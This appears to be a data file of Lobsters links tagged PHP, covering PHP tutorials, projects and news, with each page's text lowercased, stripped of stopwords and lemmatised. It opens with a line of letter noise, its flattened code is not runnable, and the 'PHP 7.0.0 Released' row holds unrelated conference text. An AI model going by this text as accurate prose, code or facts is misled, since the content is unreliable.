hhhhhhhhp uhp uhhhhhhhhhhp e c hhhhhhhf dhhhhf hhhhhhhhhhp p c dhhhp jhhhhbuuuu jhhhhhhhhp e z ee hhhhhhhhhhhhhhhhhp gdp jd e dhhhhhhhhhhhhhhp edp zd c hhhhp e f f f beeze e p ede z r e c p f p p zeeezd ze c c p e p e f p p p dfd f j p dp e c b p e b p e f f bc b f z p c e f b f f p f
199,Lobsters,php,PHP programming,InstagramUploader - Upload images to instagram without needing the app.,https://github.com/Codeusa/InstagramUploader,instagramuploader upload image instagram without needing app,instagramuploader nt work anymore documentation example need password give medium id image account contributing,instagramuploader discontinued project mine create web service uploading photo instagram code allows bulk upload multiple file instagram could serve reference creating app nt work anymore suddenly stop working need extract new signature key instagram app pretty good write found documentation lost sorry attempt rewrite example test using web app check test account need password us api call official app us password reverseing oauth allow uploading never got finishing give medium id image account congratulation account requires solve captcha upload solve phone write method retreive browser get back normal contributing submit pull request
201,Lobsters,php,PHP programming,PHP 7.0.0 Released,http://php.net/archive/2015.php,php released,,first time php tour take place outside france afup locale branch luxembourg welcome abbey neumünster historical venue heart luxembourg city english speaker come join u many talk proposed english afup french php usergroup glad announce fourth edition php tour held luxembourg city may php expert share advanced knowledge experience developer decision maker company keynote session workshop year around corner amazon microsoft office event partly focused theme php cloud tool continuous integration security cost course lot talk php innovation improvement julien pauli thibaut lenclos wim godden oswald de riemaecker françois zaninotto first speaker confirmed event join dream team stay tuned discover program next day presentation length minute includes question time hour workshop limited audience planned wednesday still convinced year celebrate php birthday afup birthday book ticket right come party u got ticket please book hotel room soon possible many hotel luxembourgcity may busy period town
202,Lobsters,php,PHP programming,Upload files to S3 and generate previews using Laravel,http://jpadilla.com/post/134064167552/upload-files-to-s3-and-generate-previews-using,upload file generate preview using laravel,php client library filepreviews repo filepreviewsio integrate filepreviews create laravel project filesystem cloud storage setup database model controller view uploading storing document integrating filepreviewsio http apifilepreviewsioauthsignup server api key server api secret generating preview callback url webhooks email protected csrf verification ngrok callback url bonus realtime pusher pusher github filepreviewsio,recently put together php client library filepreviews immediately thought putting together blog post use year according repo writing single line php looked laravel since seems rave day alright let get step step guide use laravel upload file generate preview extract metadata using filepreviewsio already uploading file laravel check integrate filepreviews create laravel project assuming probably composer already installed composer createproject laravellaravel preferdist filepreviewslaravelexample filesystem cloud storage setup example using aws store file got bucket credential let setup project use first add support laravel composer require since one want commit credential modify configfilesystemsphp use environment variable driver key env secret env region env bucket env add corresponding credential project env file database use sqlite example instead laravel default mysql set dbconnection sqlite project env file also need create empty sqlite database file storagedatabasesqlite model need create document model document model name file url original file previewurl url preview generated filepreviews preview json string containing result metadata generated filepreviews first generate model pertaining migration file php artisan make model document migration need add rest field migration running find migration inside databasemigrations directory named something like make sure function look like following public function schema create document function blueprint table table increment id table string name table string file table string previewurl nullable table json preview nullable table timestamps run migration php artisan migrate controller simple application allow list existing document create new one simplify thing bit generate resource controller php artisan make controller documentcontroller let go ahead add route route resource document documentcontroller next configure controller function index render list document create render form php namespace apphttpcontrollers use illuminatehttprequest use appdocument use apphttprequests use apphttpcontrollerscontroller class documentcontroller extends controller display listing resource return illuminatehttpresponse public function index document document return view documentsindex compact document show form creating new resource return illuminatehttpresponse public function create return view documentscreate note make sure importalias document model adding use appdocument thing like always got view controller missing templatesviews index create create resourcesviewsdocumentsindexbladephp view list created document showing id name previewurl available also add link create route html head head body document p href route documentscreate create document p foreach document document ul id document document id li id document id li li name href document url document name li li class previewurl document previewurl href document previewurl preview else preview endif li ul endforeach body html create resourcesviewsdocumentscreatebladephp view show error form allow submitting form file input field html head head body create document count error div ul foreach error error li error li endforeach ul div endif form action document method post enctype multipartformdata csrffield p label file file label input type file name file p input type submit form body html note make sure form correct enctype else issue uploading file uploading storing document fun start let add store function documentcontroller php namespace apphttpcontrollers use storage use illuminatehttprequest use appdocument use apphttprequests use apphttpcontrollerscontroller class documentcontroller extends controller display listing resource return illuminatehttpresponse public function index document document return view documentsindex compact document show form creating new resource return illuminatehttpresponse public function create return view documentscreate store newly created resource storage param illuminatehttprequest request return illuminatehttpresponse public function store request request validate request file required file request file file file isvalid name file getclientoriginalname key document name storage disk put key filegetcontents file document new document document name name document file key document save return redirect document note make sure importalias document model adding use storage couple thing going let break validate file field present make sure file valid store file file stored private default meaning need generate temporary url access create document using file name key file stored redirect document since file stored privately need way generate temporary secure url access good place add model append dynamic property model called url using underlying aws client library create presigned url expires minute access property like eg document url php namespace app use storage use config use illuminatedatabaseeloquentmodel class document extends model protected appends url public function geturlattribute return getfileurl attribute file private function getfileurl key storage disk client getdriver getadapter getclient bucket config get command client getcommand getobject bucket bucket key key request client createpresignedrequest command minute return string request geturi run php artisan serve navigate http pick file submit redirected http see created document click file name redirected file using presigned url success still actually done anything filepreviews point example now serf idea people would actually already see filepreviews fit integrating filepreviewsio put together package help implement filepreviews laravel project let install composer require filepreviewsfilepreviewslaravel need add service provider facade configappphp provider filepreviewslaravelfilepreviewsserviceprovider class alias filepreviews filepreviewslaravelfilepreviewsfacade class customize configuration file publish package configuration running php artisan vendor publish signup filepreviewsio account going http apifilepreviewsioauthsignup create free application get server api key server api secret application setting add project env filepreviewsapikeyyourfilepreviewsserverapikey filepreviewsapisecretyourfilepreviewsserversecretkey generating preview need request generating preview file uploaded document created let add function model call controller public function requestpreview fp app filepreviews option metadata checksum ocr data documentid attribute id url getfileurl attribute file return fp generate url option asking filepreviews generate request file extract file checksum ocr also adding document id use later identify previewmetadata belongs document let tweak controller store function public function store request request validate request file required file request file file file isvalid name file getclientoriginalname key document name storage disk put key filegetcontents file document new document document name name document file key document save document requestpreview return redirect document creating document calling document requestpreview let filepreviews know want run php artisan serve navigate http pick file submit redirected http see created document still see preview recall requestpreview function call fp generate url option let filepreviews know want extracted file get confirmation result yet fire forget operation since could possibly take minute depending file size requested metadata could poll filepreviews result really efficient filepreviews allows subscribe application webhook setting callback url webhooks let go ahead setup application handle webhooks filepreviewslaravel really easy add following route apphttproutesphp route post filepreviewswebhook email protected since filepreviews webhooks need bypass laravel csrf verification sure list uri exception apphttpmiddlewareverifycsrftokenphp middleware php namespace apphttpmiddleware use illuminatefoundationhttpmiddlewareverifycsrftoken baseverifier class verifycsrftoken extends baseverifier uris excluded csrf verification var array protected except filepreviewswebhook filepreviews webhook controller registered fire two event filepreviewssuccess filepreviewserror let create listener applistenersfilepreviewssuccessphp handle filepreviewssuccess event php namespace applisteners use event use appdocument class filepreviewssuccess handle event param array result return void public function handle result documentid result userdata documentid document document find documentid document previewurl result preview url document preview jsonencode result document save let setup event listener mapping application appproviderseventserviceproviderphp protected listen filepreviewssuccess applistenersfilepreviewssuccess listener react filepreviewssuccess event look document match documentid update try locally recommend using something like ngrok php artisan serve running another tabwindow run ngrok setup ngrok forwarding url callback url filepreviews application setting done navigate http pick file submit second see request logged ngrok status ok navigate http see link preview instead preview click see image file previously uploaded super cool stuff right bonus realtime pusher really liking laravel show add realtime goodness using pusher already working done need refresh see whenever document get preview let add support broadcasting event pusher composer require pusherpusherphpserver go signup free account pusher create app set credential project env pusherkeyyourpusherappkey pushersecretyourpusherappsecret pusherappidyourpusherappid let create event appeventsfilepreviewsgeneratedphp event broadcast filepreviews channel event called filepreviewsgenerated php namespace appevents use illuminatequeueserializesmodels use illuminatecontractsbroadcastingshouldbroadcast use appeventsevent use appdocument class filepreviewsgenerated extends event implement shouldbroadcast use serializesmodels public document create new event instance return void public function construct document document document document get channel event broadcast return array public function broadcaston return filepreviews get broadcast event name return string public function broadcastas return filepreviewsgenerated tweak filepreviewssuccessphp listener fire filepreviewsgenerated event saving document php namespace applisteners use event use appdocument use appeventsfilepreviewsgenerated class filepreviewssuccess handle event param array result return void public function handle result documentid result userdata documentid document document find documentid document previewurl result preview url document preview jsonencode result document save event fire new filepreviewsgenerated document left add pusher javascript code index view html head head body document p href route documentscreate create document p foreach document document ul id document document id li id document id li li name href document url document name li li class previewurl document previewurl href document previewurl preview else preview endif li ul endforeach script src http script script src http script script function enable pusher logging nt include production pusherlog function message windowconsole windowconsolelog windowconsolelog message var pusherkey config broadcastingconnectionspusherkey pusher new pusher pusherkey encrypted true channel pushersubscribe filepreviews channelbind filepreviewsgenerated function data var doc document datadocumentid previewurl docfind previewurl previewurlhtml href datadocumentpreviewurl preview script body html php artisan serve ngrok running need new tabwindow run php artisan queue listen complete source code example project available github question feedback post filepreviewsio feel free let know
203,Lobsters,php,PHP programming,Dance to Calypso - Wordpress' Node + React project,http://ma.tt/2015/11/dance-to-calypso/,dance calypso wordpress node react project,one hardest thing technology disrupt responsibility ceo automattic january last year issued new equity company raise year woocommerce acquisition opex wordpress six major release past two year around corner power web wordpresscom project version release would build starting scratch today knowing learned past year building wordpress node react open jetpack loneliest free,one hardest thing technology disrupt trying darndest cool news introduce today took responsibility ceo automattic january last year faced two huge problem growth constrained lack capital technological foundation past decade strong enough demand next one first relatively straightforward answer found fantastic partner agreed fair price issued new equity company raise started investing area felt high potential like year woocommerce acquisition war chest give u huge array option especially given fairly flat burn rate need raise money keep company going capital raise future purely discretionary since last may round happened spent investment opex second much harder address wordpress codebase actually incredible many way result many thousand people collaborating year wordpress greatest strength also holding back wordpress codebase contains sea institutional knowledge countless bug fix handle hundred edge case integrates constant security improvement coded scale development move fast clip six major release past two year around corner power flexibility undeniable wordpress passed huge milestone power web run web host scale serve billion pageviews one largest site web wordpresscom interface however struggle many u attempted give reboot project version release release made clear incremental approach give u improvement needed two thing helped make wordpress strong stable powerful tool backward compatibility working without javascript actually holding back basic paradigm wpadmin largely five year ago working within become limiting time seemed ripe something new something going break back compat need really good reason improvement open source project fade away rather make evolutionary jump asked big question would build starting scratch today knowing learned past year building wordpress beginning last year decided start experimenting see today announcing something brand new new approach wordpress open sourcing code behind project codenamed calypso culmination month work dozen talented engineer designer pleasure working contributor commits calypso incredibly fast charm written purely javascript leveraging library like node react apipowered apis open available every developer world great place read allowing follow site across web even using wordpress social stats like notification baked fully responsive make small put sidebar go fullscreen really fun write especially draganddrop image uploads fully multisite advanced user manage hundred wordpresses one place able manage plugins theme jetpack site including autoupgrading open source future development happening open available anyone adapt make including building custom interface distribution working web service besides wordpresscom lot people thought keep proprietary throughout life learned give away get back still ton figure around plugins extensibility contribution window linux release api speed localization harmonizing wordpresscom api wpapi work core wordpress thousand php developer need become fluent javascript recreate admin interface fashion also really excited revisit redesign many screen first version door beginning ending loneliest better thing yet come dig check link read calypso different perpsectives huge bet incredibly risky difficult execute paid like disruption uncomfortable sure controversial circle team accomplished short time amazing incredibly proud everyone contributed contribute future exciting project involved career core wordpress server calypso client think good chance bring another web onto open source making web open place people life free curious changed chart related
204,Lobsters,php,PHP programming,Thread carefully,http://blog.madewithlove.be/post/thread-carefully,thread carefully,pthreads getting know pthreads setup zts zend thread safety nomenclature pthreads threaded object worker pool worker simple asynchronous example run managing job worker gathering result pool pooling job pool autoloading context inheritance case closure synchronization notification bonus round threading command bus need serializable resource pitfall resource data corruption waiting github gist repository link,far remember php always terrible reputation handling heavy asynchronous task long wanted parallelize long task resort forking pcntlfork issue could nt really handle result task properly etc habit kind developed go straight intricate solution queuing delay task anything react php even using another language altogether php threading importantly lot easier probably think article going dive pthreads extension short posix thread around since feel like many people forget exists assume going painful use mostly official documentation rather slim familiar threading author pthreads nice summary going quote threading dividing instruction unit execution distributing unit among processor andor core way maximize throughput application threading fit use case ca nt parallelize thing expect faster php reserved specific case situation able php existing domain logic getting know pthreads setup first need make sure extension sailing homebrew version php nothing simpler install like extension brew install one small note pthreads compiled php requires withthreadsafety flag done installing effectively running different version php called zts zend thread safety version extension nt care get warning like running php version error something mcrypt compiled different version php simply reinstall extension per example brew reinstall good go blackfire extension enabled also recommend disabling zts support still experimental might encounter issue nomenclature pthreads extension lot different concept nt necessarily explained well prove confusing first need know three type class provided extension threaded object task threaded job want execute asynchronously worker class responsible running job synchronizing result pool responsible managing multiple worker dispatching job extension provides handful class simply derive see diagram core every class child threaded base class extension nonetheless rarely use child provide convenient method generally speaking easier deal simple asynchronous example note brevity sake wo nt declare property class example add docblocks totally nt find kill let start easy simple web crawling example start creating job class extending thread extends threaded class extending threaded must run method defining task thread case simple filegetcontents google search keep simple php class searchgoogle extends thread public function construct query query query public function run html filegetcontents http googlefr q query let try creating instance per example search cat start job call start method wo nt return anything job start separate thread php job new searchgoogle cat job start job started several method call check job isrunning one want join method make parent thread wait task finished join back main thread basically happening join called sure class holding result php job new searchgoogle cat job start wait job finished print result job join echo job html mind per example start multiple search time get result php search cat dog bird foreach search search search new searchgoogle search search start foreach search search search join echo substr search html print timestamp within job class public function run echo microtime true phpeol html filegetcontents http googlefr q query run file see three job indeed started time php multiplephp doctype html html doctype html html doctype html html managing job worker relatively easy ideally nt want manage job ie nt want start individually join one one might want throw job somewhere let thing get result done worker come play worker class top stack job start join php class searcher extends worker public function run echo running getstacked jobsphpeol stack job worker worker new searcher search dog cat bird foreach search search search new searchgoogle search worker stack search start job worker start join job close worker worker shutdown would print something like running job gathering result order worker keep track result job simply add method call job stack job onto worker said job aware worker able access worker let gather html fetched job php class searcher extends worker public data public function run echo running getstacked jobsphpeol avoid corrupting array use arraymerge instead data html public function adddata data data arraymerge data data class searchgoogle extends threaded public function construct query query query public function run echo microtime true phpeol worker adddata filegetcontents http googlefr q query stack job worker worker new searcher search dog cat bird foreach search search search new searchgoogle search worker stack search start job worker start join job close worker worker shutdown foreach worker data html echo substr html phpeol run get proper result running job doctype html html doctype html html doctype html html may notice worker stack new searchgoogle search worker keep track reference job ie start worker job stacked onto still reference something main thread rather cumbersome class created called pool class let look pooling job pool class whose purpose dispatch job onto one worker manage job described documentation pooling provides higher level abstraction worker functionality including management reference way required pthreads let rewrite previous example pooling create pool need pas three argument number worker pool able use time kind worker pool use class name string facultative argument pas worker creating case use native pool worker class new instance look like php pool new pool worker class submit job pool calling pool submit threaded main difference worker job start soon submit pool nt handle reference anymore php create pool submit job pool new pool worker class pool submit new searchgoogle cat pool submit new searchgoogle dog pool submit new searchgoogle bird close pool done pool shutdown see job start time everything work fine let gather result order interact job pool without loop worker pool convenient collect method act filter sort pas closure return whether job stay pool usually return whether job done pthreads provides collectable class extends threaded two additional method setgarbage isgarbage mark job done ready collected garbage collector let write pool class gather result job discard php class searchpool extends pool public data public function process run loop long job pool count work collect function searchgoogle job job marked done collect result job isgarbage data job query job html return job isgarbage job done shutdown pool shutdown return data also mean need edit searchgoogle job extend collectable call setgarbage end run method php class searchgoogle extends collectable public function construct query query query public function run echo microtime true phpeol html filegetcontents http googlefr q query setgarbage following php create pool submit job pool new searchpool worker class pool submit new searchgoogle cat pool submit new searchgoogle dog pool submit new searchgoogle bird pool submit new searchgoogle plane pool submit new searchgoogle car data pool process vardump data run see job executed time completed time able yield result easily time php poolingphp array bird doctype html cat doctype html car doctype html dog doctype html plane doctype html php poolingphp user system cpu total autoloading context inheritance example rather basic start delving advanced example likely hit one common speedbump child thread nt inherit class autoloaded parent context understand grasp child thread nt necessarily inherit parent context context might even inconvenient job one small standalone task nt want load shit happening upstairs memory pas option start method thread instance limit much passed parent php define myconstant true function test class foobar class example extends thread public function run vardump defined myconstant vardump functionexists test vardump classexists foobar true true true job new example job start default argument pthreadsinheritall job join false false true job new example job start pthreadsinheritclasses job join true true true job new example job start pthreadsinheritclasses pthreadsinheritconstants pthreadsinheritfunctions job join let require something composer per example symfonyvardumper nicerlooking wrapper around vardump let try use provided dump function job php require vendorautoloadphp class example extends thread public function run dump foobar job new example job start job join fail throw following exception class symfonycomponentvardumpervardumper found class loaded main thread nt child thread multiple way circumvent easiest one course require vendorautoloadphp run job pretty disgusting nicer way go create worker class dedicated setting autoloading running job idea nt require anything job class php class autoloadingworker extends worker public function run require vendorautoloadphp create worker stack job worker new autoloadingworker job new example worker stack job worker start worker join use pool specify custom worker pool new pool autoloadingworker class pool submit new example pool shutdown would yield correct result php autoloadingphp foobar foobar case closure far dealing class everywhere closure also good source headache aware context fully preserved per example code probably think work php class closurerunner extends collectable public function construct closure closure closure public function run closure closure closure setgarbage foo test pool new pool worker class pool submit new closurerunner function use foo vardump foo pool shutdown wo nt closure compiled main thread reference variable passed job try run child thread reference wo nt point existing variable boil php difficulty serialize closure said exist convenience method create job closure proper serialization threaded method mean available child per example following would work php pool new pool worker class foo test pool submit collectable function use foo vardump foo setgarbage pool shutdown synchronization notification far nt shown great interest child thread situation may arise need coordinate happening main thread happening child thread done wait notify method related helper iswaiting say per example something parent thread task parallel child thread need result child thread complete main task parent thread would like php class job extends thread public function run iswaiting work long waiting parent synchronized function result done notify job new job job start operation main thread sleep notify child thread need get result job synchronized function job job wait echo job result job note wrap every call wait notify job synchronized call ensure everything synchronized make call party ready work main thread synchronize job wait notification sends different simply job join child thread wo nt merged back main thread continue live life thing synchronized call call back previous diagram notifywait routine would look like might seem useful first allow lot thing per example create stripped equivalent promise creating promise class wait closure completed child thread report main thread php class promise extends thread public function construct closure closure closure closure start public function run synchronized function closure closure result closure notify public function callable callback return synchronized function use callback result wait callback result promise new promise function return filegetcontents http googlefr promise function result echo result also highlight something essential waiting notification nt different thread make child thread wait another child thread make main thread notify child thread bonus round threading command bus example seen previously basic sake comprehension task ideally want thread likely much bigger complex dependency common case modern php project backed command bus laravel tactician whatever row boat threading easily integrated context custom worker class would receive command bus instance execute command like php use leaguetacticiancommandbus class commandbusworker extends worker public function construct commandbus bus bus bus public function run require vendorautoloadphp public function handle command return bus handle command class commandjob extends collectable public function construct command command command public function run worker handle command pool new pool commandbusworker class new commandbus pool submit new commandjob new command argument pool submit new commandjob new anothercommand argument two command would threaded would run parallel benefit command bus top could even create special pool would eliminate boilerplate php class commandbuspool extends pool public function construct commandbus bus parent construct commandbusworker class bus public function submit command return parent submit new commandjob command pool new commandbuspool new commandbus pool submit new command argument one thing watch though dependency passed worker like need serializable child threaded scalar mean must property containing closure simplest way recreate instance child thread container service provider per example technique resolve command bus instance within child thread resource pitfall resource command bus example highlight something absolutely watch resource passed main thread child thread limitation inner working php worked work edge case recommended steer clear passing resource around thread mean resource mean socket database connection stream need database child thread create worker connects database context need socket thing connect socket within child thread instead main thread way circumvent save major headache trying think child thread completely different context better come data corruption another pitfall ignored article example brievty data corruption say worker hold array job access two job modify time even way seems safe array get corrupted limitation pthreads issue threading general two thread modify value time shit happens go around pthreads provides stackable class extend create thread safe data synchronization use php class result extends stackable class job extends thread public function construct test test test start public function run test rand result new result job job new job result foreach job job job join print vardump count result run get count array expected try standard array like result get every time structure extending threaded serialized nt reference original variable anymore value correct child thread wo nt main thread much possible move around data thread try always pas child threaded like stackable wo nt serialized made specially transported across thread data corruption memory issue waiting go indepth introduction threading php pthreads hope next time bunch thing time think twice discarding php option completely threading wo nt always solution specific use case split separate unit work hence command bus fit nicely nonetheless solid tool toolbox pthreads extension crazy good well maintained already compatible new version came version used article example latest even better extension repository available github rife example documentation explanation inner mechanic author krakjoe also good series gist explain reasoning behind pthreads threading php general highly recommend example article available repository need go away friend thread carefully link
205,Lobsters,php,PHP programming,grav,https://github.com/getgrav/grav,grav,grav fast simple flexible zero package management system requirement quickstart downloading grav package readybuilt downloads page http getgravorg composer stable github http githubcomgetgravgrav terminal console plugin theme dependency grav cli application install procedure adding functionality plugins theme downloads page http getgravorg grav package manager updating grav package manager contributing contributing guide security issue contact getgravorg getting started exploring backer become backer sponsor become sponsor license license running test,grav grav fast simple flexible filebased webplatform zero installation required extract zip archive already running follows similar principle flatfile cm platform different design philosophy grav come powerful package management system allow simple installation upgrading plugins theme well simple updating grav underlying architecture grav designed use wellestablished bestinclass technology ensure grav simple use easy extend key technology include requirement quickstart option get grav downloading grav package download readybuilt package downloads page http getgravorg composer create new project latest stable grav release following command composer createproject getgravgrav webrootgrav github clone grav repository http githubcomgetgravgrav folder webroot server eg webrootgrav launch terminal console navigate webroot folder cd webroot git clone http githubcomgetgravgravgit install plugin theme dependency using grav cli application bingrav cd webrootgrav bingrav install check install procedure information adding functionality download plugins theme manually appropriate tab downloads page http getgravorg preferred solution use grav package manager gpm bingpm index display available plugins install one bingpm install plugintheme updating update grav use grav package manager gpm bingpm selfupgrade update plugins theme bingpm update contributing appreciate contribution grav whether related bug grammar simply suggestion improvement please refer contributing guide guidance topic security issue discover possible security issue related grav one plugins please email core team contact getgravorg address soon possible getting started exploring backer support grav monthly donation help u continue development become backer sponsor become sponsor get logo readme github link site become sponsor license see license running test first install dev dependency running composer update grav root composer test run unit test always executed successfully site window user use composer testwindows command also run single unit test file eg composer test testsunitgravcommonassetstestphp
206,Lobsters,php,PHP programming,Detect up to 1327 disposable email providers with MailChecker,https://github.com/FGRibreau/mailchecker,detect disposable email provider mailchecker,mailchecker database throwable email domain imagecharts use imagecharts free upgrade usage nodejs javascript php python http githubcomjonashaagdjangoindisposable ruby rust elixir clojure go installation accept pullrequests package manager data source torvpn bloggingwv please add dataset listtxt regenerate library listtxt development docker backer maintainer sponsor contributor license,mailchecker crosslanguage email validation backed database throwable email domain helpful contact user want avoid error causing lack communication want block spamboxes need embed chart email imagecharts serverside rendering pain url chart http imagechartscomchart chtlc chart type chds chart data chxtx axis axis label size use imagecharts free upgrade mailchecker public api normalized change nodejsjavascript mailchecker email mailcheckerisvalid email php mailchecker email mailchecker isvalid email python import mailchecker mailcheckermailchecker misvalid bla examplecom became import mailchecker mailcheckerisvalid bla examplecom mailchecker currently support usage nodejs var mailchecker require mailchecker mailcheckerisvalid myemail yopmailcom consoleerror rly processexit mailcheckerisvalid myemailcom consoleerror rly processexit javascript script type textjavascript src mailcheckerplatformjavascriptmailcheckerjs script script type textjavascript mailcheckerisvalid myemail yopmailcom consoleerror rly mailcheckerisvalid myemailcom consoleerror rly script php include dir mailcheckerplatformphpmailcheckerphp mailchecker isvalid myemail yopmailcom die rly mailchecker isvalid myemailcom die rly python pip install mailchecker package yet drop mailcheckerpy want use mailchecker import mailchecker mailcheckerisvalid bla examplecom print rly django validator http githubcomjonashaagdjangoindisposable ruby require mailchecker unless mailcheckervalid myemail yopmailcom fail rly end rust extern crate mailchecker asserteq true mailchecker isvalid plop plopcom asserteq false mailchecker isvalid nok gmailcomn asserteq false mailchecker isvalid ok guerrillamailblockcom elixir coderequirefile mailcheckerex mailcheckerplatformelixir unless mailcheckervalid myemail yopmailcom raise rly end unless mailcheckervalid myemailcom raise rly end clojure package yet drop mailcheckerclj want use loadfile platformclojuremailcheckerclj mailcheckervalid myemail yopmailcom throw throwable rly mailcheckervalid myemailcom throw throwable rly go package main import log githubcomfgribreaumailcheckerplatformgo mailcheckerisvalid myemail yopmailcom logfatal rly mailcheckerisvalid myemailcom logfatal rly installation go go get http githubcomfgribreaumailchecker nodejsjavascript ruby gem install rubymailchecker php composer require fgribreaumailchecker accept pullrequests package manager data source torvpn td table last map function return thisinnertext toarray bloggingwv arrayprototypeslicecall documentqueryselectorall entry ul li map function el return elinnertext please add dataset listtxt regenerate library listtxt run requires nodejs npm run build development development environment requires docker install setup every language dependency parallel docker npm install run every language setup parallel docker npm run setup run every language test parallel docker npm test backer maintainer amazing people maintaining project sponsor sponsor yet first contributor amazing people contributed code project license unless stated otherwise work licensed
207,Lobsters,php,PHP programming,Extremely Defensive PHP,https://ocramius.github.io/extremely-defensive-php/,extremely defensive php,many much everyone know release let start bold way mean know like one way plug maybe good design let make one concept clear nt write nt write code assuming make right nt mean anything anyway exist avoid unnecessary unnecessary find another way avoid includes default assume foolish enforce php wtfbbq ensure simplify poka yoke one one make default different add really requires understanding contradiction really every supposed maybe yes implore love happen reduce bare minimum,extremist became extremist maintain many project allow much everyone want shiny new feature talk aggressive practice practice work well longlived project every os project probably adopt know limit nt like practice nt apply please considerate release let start bold way mean sorry nt admit dumbest know defensive driving defensive driving assuming driver make mistake defensive coding like defensive driving cautious everyone code cautious code poka yoke avoid mistake fool proofing one way plug maybe good design let make one concept clear code reusable code reusable ninety percent everything crap theodore sturgeon abstraction reusable nt write crap nt write code code usecase reusecase assuming object calisthenics make state immutable greatly reduces bug cognitive load got right performance profile profile profile log n setter nt mean anything anyway constructor injection point uninitialized property class dbconnection public function construct public function setlogger logger logger null logger logger optional dependency exist class dbconnection public function construct logger logger look setter dbconnection new dbconnection new fakelogger avoid unnecessary public method unnecessary find another way public method like child written going maintain rest life stefan priebsch avoid logic switch parameter class spammer public function spam email template optoutlink false yes really bad spammer class spammer public function sendillegalspam email template without optout link public function sendapparentlylegalspam email template optout link state encapsulated class bankaccount public function setlastrefresh datetime lastrefresh lastrefresh lastrefresh example purposely simplifiedsilly currenttime new datetime setlastrefresh currenttime setlastrefresh currenttime stuff currenttime settimestamp atimestamp class bankaccount public function setlastrefresh datetime lastrefresh lastrefresh clone lastrefresh class bankaccount public function setlastrefresh datetimeimmutable lastrefresh lastrefresh lastrefresh class moneytransfer public function construct money amount datetime transferdate amount amount transferdate transferdate class moneytransfer public function construct money amount datetime transferdate amount amount transferdate clone transferdate external access includes subclass private property default public method transaction public function addmoney money money money money public function markbillpaidwithmoney bill bill money money bill bill paid money bankaccount addmoney money bankaccount markbillpaidwithmoney bill money method part single interaction exposed separate public apis private function addmoney money money money money private function markbillpaidwithmoney bill bill money money bill bill paid money public function paybill bill bill money money addmoney money markbillpaidwithmoney bill money bankaccount paybill bill money single public api endpoint wrapping around state change assume method idempotence userid controller request get userid userroles controller request get userroles subsequent method call assuming request apart foolish api request controller request userid request get userid userroles request get userroles assumption request nt trust enforce strict invariant class train public function construct array wagon wagon function wagon wagon return wagon wagon yes horrible work php class prisonertransferrequest param mixed accesslevel false none true guard required null decided special cargo needed high security needed public function approve securitylevel wtfbbq class prisonertransferrequest public function approve prisonersecuritylevel securitylevel value object ensure consistency value object simplify data validation register new emailaddress ocramius gmailcom need revalidate inside register thing dofoo dobar thing thing dofoo thing thing dobar thing dofoo thing dobar poka yoke one one way thing dofoo thing dobar make class final default extension different usecase extending interface add meaning use extends nt even need extends trait really need reuse code dry hidden coupling class loginrequest public function clone time clone time cloning requires encapsulated state understanding contradiction class human public function clone throw new domainexception would even clone currently illegal really serializable know lifecycle every dependency object even supposed stored somewhere class myawesomething public function sleep throw new badmethodcallexception thing haz maybe serialize serializable test scenario yes bring crap score make cry implore le feature love le feature interface authservice return bool throw invalidargumentexception throw incompatiblecredentialsexception throw unavailablebackendexception public function authenticate credential credential class mylogin public function construct authservice auth auth auth public function login username password auth authenticate new basiccredentials username password return true return false happen boolean true returned boolean false returned invalidargumentexception thrown incompatiblecredentialsexception thrown unavailablebackendexception thrown little code test already reduce feature bare minimum yagni strict invariant await strict return strict
208,Lobsters,php,PHP programming,"Why We're Still Seeing PHP 5.3 In The Wild (Or: PHP Versions, A History)",https://ma.ttias.be/why-were-still-seeing-php-5-3-in-the-wild-or-php-versions-a-history/,still seeing php wild php version history,jq php version php version php still used installation php php wordpress installation prologue shared hosting wordpress autoupdate php version support year version v server setup fair share server setup many multiple phpfpm master per server hhvm earlier day hosting configuration change version moving php forward minimal php version php php cve vulnerability irrelevant,wordpress offer api list php version used wild show interesting number warrant extra thought current statistic php version used wordpress installation us jq json formatting cli php version curl http jq php version curl http jq version stand php still used installation php php version end life considered end life still account wordpress installation prologue shared hosting stats gathered wordpress anonymously since wordpress installation shared hosting safe assume done never looked good thing wordpress autoupdate web would doomed course wordpress installation custom server managed system etc account small percentage wordpress installation important keep mind rest number mostly applicable shared hosting php version support quick history relevant php version meaning upwards ignore small percentage site still running php version th released th th end th th total duration th td july td td september td td day td td november td td august td td day td td november td td january td td day td td june td td august td td day td td march td td september td td day td td june td td july td td day td td august td td august td td day td wonder still seeing php wild version supported year mean lot user installed wordpress php host never bothered updating install update never mentality long wordpress continues work would right research correct month supported version php time support dropped released couple month later version v server setup php around really long time seen fair share server setup run modphp apache cgi fastcgi embedded cli litespeed fpm many evolving multiple phpfpm master per server site rise hhvm see even different type php deployment remember earlier day hosting typical php setup shared hosting version th server setup th td apache modphp td td apache modphp td td apache suexec cgi td td apache suexec fastcgi td td apache fpm td td apache fpm td td apache fpm td serverside seen lot movement current method running php fpm daemon far superior running modphp cgifastcgi took hosting world quite time adopt even fpm support coming php server still running cgifastcgi wasis terrible way run php probably made take long adopt php shared hosting server required complete rewrite everything shared hosting cgifastcgi implementing proxysetups pas data phpfpm since fpm support come php since couple minor version hosting provider experienced fpm fpm config ready adopting php trivial php changed opcache made configuration change serverside impact php supported really long time php took age implemented shared server setup prolonging life php even long past expiration date installing php new red hat enterprise linuxcentos get version rhel still backports security newer release needed essentially end life version may get security get bug fix cause increase php worldwide default version latest rhelcentos moving php forward order let ancient version php finally rest peace thing need change drastically reason kept php alive long wordpress need bump minimal php version least php drupal also run php drupal bumping minimum version shared hosting provider need drop php support move user o vendor packagers need make least php default instead nearly end life improve point encouraging shared hosting user upgrade later release finger crossed wordpress o vendor unfair blame php company still seeing wild today version supported really long time install base naturally large later release php seen shorter support cycle make user think upgrading schedule accordingly consistent release deprecation schedule vital faster adoption rate well ignore security speed scalability added benefit proclaimed php cve vulnerability irrelevant still stand
